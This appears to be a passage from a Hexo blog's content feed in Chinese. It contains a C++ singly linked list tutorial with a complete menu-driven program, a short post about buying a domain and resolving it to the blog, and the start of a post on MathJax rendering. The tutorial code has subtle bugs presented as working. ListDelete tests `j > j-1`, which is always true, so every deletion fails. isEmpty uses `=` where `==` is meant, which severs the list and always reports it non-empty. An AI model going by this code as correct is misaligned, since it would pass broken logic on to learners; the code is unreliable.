class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="删除指定位置元素"><a href="#删除指定位置元素" class="headerlink" title="删除指定位置元素"></a>删除指定位置元素</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除指定位置元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListDelete</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L; <span class="comment">// 有可能删除第一个元素，所以不指向首元结点</span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((p-&gt;next) &amp;&amp; j &lt; i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next)||j &gt; j<span class="number">-1</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;删除位置不合理!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* q = p-&gt;next; <span class="comment">// 临时保存被删结点的地址以备释放</span></span><br><span class="line">        p-&gt;next = q-&gt;next; <span class="comment">// 改变删除结点前驱结点的指针域，指向删除结点的后继结点</span></span><br><span class="line">        <span class="keyword">delete</span> q; <span class="comment">// 释放删除结点的空间</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;删除成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="删除和清空表"><a href="#删除和清空表" class="headerlink" title="删除和清空表"></a>删除和清空表</h3><h4 id="清空单链表"><a href="#清空单链表" class="headerlink" title="清空单链表"></a>清空单链表</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 清空单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearList</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList p,q;</span><br><span class="line">    p = L-&gt;next; <span class="comment">// p指向第一个结点</span></span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">        p = q;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;链表已清空!&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="整表删除"><a href="#整表删除" class="headerlink" title="整表删除"></a>整表删除</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 整表删除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryList</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList p;</span><br><span class="line">    <span class="keyword">while</span>(L)</span><br><span class="line">    &#123;</span><br><span class="line">        p = L;</span><br><span class="line">        L = L-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;链表已删除&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取单链表的长度"><a href="#获取单链表的长度" class="headerlink" title="获取单链表的长度"></a>获取单链表的长度</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取单链表的长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetLen</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    Node* p = L;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="两个有序链表的归并"><a href="#两个有序链表的归并" class="headerlink" title="两个有序链表的归并"></a>两个有序链表的归并</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个有序链表的归并</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(LinkList A,LinkList B,LinkList &amp;C)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = A-&gt;next;  <span class="comment">// p指向首元结点</span></span><br><span class="line">    Node* q = B-&gt;next;  <span class="comment">//q指向首元结点</span></span><br><span class="line">    C = A;</span><br><span class="line">    C-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    Node* r = C;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; q != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &lt;= q-&gt;data)</span><br><span class="line">        &#123;</span><br><span class="line">            r-&gt;next = p;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            r-&gt;next = q;</span><br><span class="line">            q = q-&gt;next;</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = p;</span><br><span class="line">    <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElemType int</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;  <span class="comment">// 结点数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span> <span class="comment">//结点指针域</span></span><br><span class="line">&#125;Node,*LinkList; <span class="comment">// Node为单链表的结点 LinkList为指向结点Node的指针</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是定义一个结构体，这个结构体有两个属性，</span></span><br><span class="line"><span class="comment">一个是ElemType类型的data;</span></span><br><span class="line"><span class="comment">另一个是这个结构体类型的指针next;</span></span><br><span class="line"><span class="comment">给这个结构定义了一个别名:Node，一个指针的别名:LinkList;</span></span><br><span class="line"><span class="comment">Node a; 等价于 struct node a;</span></span><br><span class="line"><span class="comment">都是声明一个struct node结构体类型的结构体变量 a;</span></span><br><span class="line"><span class="comment">LinkList b; 等价于 struct Node *b;等价于 Node *b;</span></span><br><span class="line"><span class="comment">但是为了提高代码的可读性，我们用LinkList声明链表eg：LinkList L</span></span><br><span class="line"><span class="comment">声明一个struct Node结构体类型的指针变量 b（这个指针变量指向结点Node）;</span></span><br><span class="line"><span class="comment">重要：</span></span><br><span class="line"><span class="comment">Node* p=L-&gt;next;//这是新建一个指针名叫p，它指向的是首元结点。</span></span><br><span class="line"><span class="comment">即：p代表首元结点的地址，*p就代表指向这个地址p，这里可理解为*p就是首元结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单链表的初始化 L为指向头结点的头指针</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(LinkList &amp;L)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">// 构造一个空的单链表L</span></span><br><span class="line">    L = <span class="keyword">new</span> Node;   <span class="comment">// 生成新的结点作为头结点，用头结点L指向头结点（这时候L就代表改单链表）</span></span><br><span class="line">    L-&gt;next= <span class="literal">NULL</span>;  <span class="comment">// 头结点的指针域置空</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 头插法创建单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateList_H</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node* p = <span class="keyword">new</span> Node; <span class="comment">// 生成新节点指针p p指向新的结点</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;请输入第&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;个元素：&quot;</span>;</span><br><span class="line">        cin&gt;&gt;p-&gt;data;</span><br><span class="line">        p-&gt;next = L-&gt;next; <span class="comment">// 从头部插入</span></span><br><span class="line">        L-&gt;next = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 尾插法创建单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateList_R</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* r = L; <span class="comment">// 尾指针r指向头结点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node* p = <span class="keyword">new</span> Node; <span class="comment">// 生成新指针结点p</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;请输入第&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;个元素：&quot;</span>;</span><br><span class="line">        cin&gt;&gt;p-&gt;data;</span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 将新节点的指针域置空</span></span><br><span class="line">        r-&gt;next = p; <span class="comment">// 将新节点*p插入尾结点*r之后</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取指定位置单链表值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetElem</span><span class="params">(LinkList L,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L-&gt;next; <span class="comment">// 生成新指针结点p指向首元结点</span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j &lt; i)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next; <span class="comment">// p指向下一个结点</span></span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j &gt; i)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;i的值不合法!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout&lt;&lt;p-&gt;data&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 单链表按值查找，返回值为找到的元素结点的指针</span></span><br><span class="line"><span class="function">Node* <span class="title">LocateElem</span><span class="params">(LinkList L,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L-&gt;next; <span class="comment">// 初始化p，使p指向首元结点</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next; <span class="comment">//顺链表扫描，直到p为空或者找到相应元素为止</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断链表是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">isEmpty</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;next = <span class="literal">NULL</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;链表为空&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;链表不为空&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 单链表指定位置插入元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LinkInsert</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> i,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L; <span class="comment">// 生成新指针结点p指向链表L 因为有可能插入到第一个，所以不指向头结点</span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j &lt; i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j &gt; i<span class="number">-1</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;插入位置不合法！&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Node* s = <span class="keyword">new</span> Node; <span class="comment">// 生成新指针结点s</span></span><br><span class="line">        s-&gt;data = e; <span class="comment">// 将结点指针s的数据域置为e</span></span><br><span class="line">        s-&gt;next = p-&gt;next;</span><br><span class="line">        p-&gt;next = s;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;数据插入成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除指定位置元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListDelete</span><span class="params">(LinkList&amp; L,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = L; <span class="comment">// 有可能删除第一个元素，所以不指向首元结点</span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((p-&gt;next) &amp;&amp; j &lt; i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next)||j &gt; j<span class="number">-1</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;删除位置不合理!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* q = p-&gt;next; <span class="comment">// 临时保存被删结点的地址以备释放</span></span><br><span class="line">        p-&gt;next = q-&gt;next; <span class="comment">// 改变删除结点前驱结点的指针域，指向删除结点的后继结点</span></span><br><span class="line">        <span class="keyword">delete</span> q; <span class="comment">// 释放删除结点的空间</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;删除成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 打印单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintList</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;该单链表为空！&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = L-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;p-&gt;data&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 清空单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearList</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList p,q;</span><br><span class="line">    p = L-&gt;next; <span class="comment">// p指向第一个结点</span></span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">        p = q;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;链表已清空!&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 整表删除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryList</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList p;</span><br><span class="line">    <span class="keyword">while</span>(L)</span><br><span class="line">    &#123;</span><br><span class="line">        p = L;</span><br><span class="line">        L = L-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;链表已删除&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取单链表的长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetLen</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    Node* p = L;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 两个有序链表的归并</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(LinkList A,LinkList B,LinkList &amp;C)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* p = A-&gt;next;  <span class="comment">// p指向首元结点</span></span><br><span class="line">    Node* q = B-&gt;next;  <span class="comment">//q指向首元结点</span></span><br><span class="line">    C = A;</span><br><span class="line">    C-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    Node* r = C;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; q != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &lt;= q-&gt;data)</span><br><span class="line">        &#123;</span><br><span class="line">            r-&gt;next = p;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            r-&gt;next = q;</span><br><span class="line">            q = q-&gt;next;</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = p;</span><br><span class="line">    <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;---------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;0---创建表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1---清空单链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;2---判断单链表是否为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;3---求单链表长度&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;4---获取单链表指定位置元素&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;5---在单链表指定位置插入元素&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;6---删除单链表指定位置元素&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;7---显示单链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;8---两个有序链表归并&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;    退出，输入一个负数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入操作代码：&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList L;</span><br><span class="line">    <span class="built_in">InitList</span>(L);</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    cin&gt;&gt;num;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(num &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">8</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			Node* A;</span><br><span class="line">			<span class="built_in">InitList</span>(A);</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;注意两个链表元素大小从小到大排序&quot;</span> &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;创建第一个链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入元素个数：&quot;</span>;</span><br><span class="line">			cin &gt;&gt; n;</span><br><span class="line">			<span class="built_in">CreateList_R</span>(A, n);</span><br><span class="line">			Node* B;</span><br><span class="line">			<span class="built_in">InitList</span>(B);</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;创建第二个链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入元素个数：&quot;</span>;</span><br><span class="line">			cin &gt;&gt; n;</span><br><span class="line">			<span class="built_in">CreateList_R</span>(B, n);</span><br><span class="line">			Node* C;</span><br><span class="line">			<span class="built_in">InitList</span>(C);</span><br><span class="line">			<span class="built_in">Merge</span>(A, B, C);</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;合并后链表元素为&quot;</span>;</span><br><span class="line">			<span class="built_in">PrintList</span>(C);</span><br><span class="line">			<span class="built_in">menu</span>();</span><br><span class="line">			cin &gt;&gt; num;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">GetLen</span>(L) == <span class="number">0</span> &amp;&amp; num != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;链表长度为0，请先为链表添加数据。&quot;</span> &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入表的长度：&quot;</span>;</span><br><span class="line">			cin &gt;&gt; n;</span><br><span class="line">			<span class="built_in">CreateList_R</span>(L, n);</span><br><span class="line">			<span class="built_in">menu</span>();</span><br><span class="line">			cin &gt;&gt; num;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in"><span class="keyword">switch</span></span> (num)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">int</span> n;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入表的长度&quot;</span>;</span><br><span class="line">			cin &gt;&gt; n;</span><br><span class="line">			<span class="built_in">CreateList_R</span>(L, n);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">ClearList</span>(L);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="built_in">isEmpty</span>(L);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;链表长度为：&quot;</span>&lt;&lt;<span class="built_in">GetLen</span>(L) &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="keyword">int</span> index;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入位置：&quot;</span>;</span><br><span class="line">			cin &gt;&gt; index;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;该位置元素为：&quot;</span>;</span><br><span class="line">			<span class="built_in">GetElem</span>(L, index);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			ElemType e;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入位置和元素：&quot;</span>;</span><br><span class="line">			cin &gt;&gt; index &gt;&gt; e;</span><br><span class="line">			<span class="built_in">LinkInsert</span>(L, index, e);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;请输入位置：&quot;</span>;</span><br><span class="line">			cin &gt;&gt; index;</span><br><span class="line">			<span class="built_in">ListDelete</span>(L, index);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="built_in">PrintList</span>(L);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;输入数字有误，请重新输入。&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="built_in">menu</span>();</span><br><span class="line">		cin &gt;&gt; num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>博客域名解析使用</title>
    <url>/2020/04/21/%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>通过Hexo搭建博客有一段时间了，在家闲着没啥事，想着先弄个域名玩一玩，也为以后搭建动态网站先奠定一个基础。<br><span id="more"></span></p>
<h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>第一次买，不太清楚这里的水深不深，没有考虑其他的网站，直接去阿里云购买域名。</p>
<p>选好了域名，然后加入清单购买。因为是第一次购买，第一年16人民币，不确定行不行，先买一年试试。然后就是实名认证了，认证速度比我想的快了许多，第二天就认证完了。（也就是今天，昨天买的域名，哈哈哈）</p>
<h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>服务器就用阿里送的半年服务器先跑着（还不知道行不行呢，万一翻车岂不尴尬）。</p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>通过ping 自己的博客，得到ip地址，然后通过ip地址进行解析，直接一次成功。（美滋滋）</p>
<p>等一会，打开就显示出博客内容了。</p>
<p>之后就是慢慢来了，域名有了，网站还远吗？</p>
]]></content>
      <tags>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>在Hexo中渲染MathJax数学公式</title>
    <url>/2020/04/17/%E5%9C%A8Hexo%E4%B8%AD%E6%B8%B2%E6%9F%93MathJax%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<p>在用markdown写技术文档时，免不了会碰到数学公式。常用的Markdown编辑器都会集成Mathjax，用来渲染文档中的类Latex格式书写的数学公式。基于Hexo搭建的个人博客，默认情况下渲染数学公式却会出现各种各样的问题。<br><span id="more"></span></p>
